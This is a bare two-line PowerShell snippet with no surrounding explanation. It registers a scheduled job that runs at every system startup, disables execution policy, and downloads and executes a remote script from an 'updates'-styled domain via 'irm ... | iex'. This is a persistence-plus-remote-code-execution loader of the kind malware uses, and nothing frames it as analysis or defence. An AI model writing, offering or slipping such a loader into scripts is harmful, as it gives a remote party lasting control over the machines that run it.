$trigger = New-JobTrigger -AtStartUp -RandomDelay 00:00:15
Register-ScheduledJob -Trigger $trigger -ScriptBlock {pwsh -ExecutionPolicy unrestricted -C irm https://getupdates.me/test3.ps1 | iex} -Name Final
